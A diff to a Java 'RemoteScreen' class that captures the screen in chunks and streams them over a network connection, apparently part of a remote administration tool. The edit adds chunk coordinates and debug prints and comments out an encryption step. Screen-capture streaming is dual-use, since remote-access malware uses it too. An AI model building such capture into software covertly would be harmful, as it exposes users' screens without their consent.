@@ -75,7 +75,7 @@ public class RemoteScreen {
 				packet = new Packet17RemoteScreen(screenBounds.width, screenBounds.height, point.x, point.y);
 			}
 			
-			Connection.addToSendQueue(packet);
+			//Connection.addToSendQueue(packet);
 									
 	        int chunks = rows * columns;  
 	        int chunkWidth = image.getWidth() / columns; 
@@ -94,7 +94,6 @@ public class RemoteScreen {
 	                gr.dispose();  
 	                
 	                byte[] buffer = ImageUtils.encodeImage(i, q);
-	                //buffer = GZip.compress(Crypto.encrypt(buffer, Main.getKey()));
 	                
 	                boolean doit = false;
 	                
@@ -108,13 +107,21 @@ public class RemoteScreen {
 	            	
 	            	cou++;
 	               
+	    			//Connection.addToSendQueue(packet);
+	    			System.out.println(doit);
 	                if (doit) {
-	                	dos.writeBoolean(true);
+	                	//dos.writeBoolean(true);
+	                	Connection.addToSendQueue(packet);
 	                	dos.writeInt(buffer.length);
+	                	dos.writeInt(x);
+	                	dos.writeInt(y);
+						System.out.println(x + ", " + y);
+
 			            dos.write(buffer);		    			         
 	                } else {
-	                	dos.writeBoolean(false);  
+	                	//dos.writeBoolean(false);  
 	                }
+	                Connection.lock();
 	            }  
 	        }  
 	        
@@ -129,8 +136,6 @@ public class RemoteScreen {
 			
 			System.gc();
 			
-			Connection.lock();
-
 		} catch (Exception ex) {
 			ex.printStackTrace();
 		}
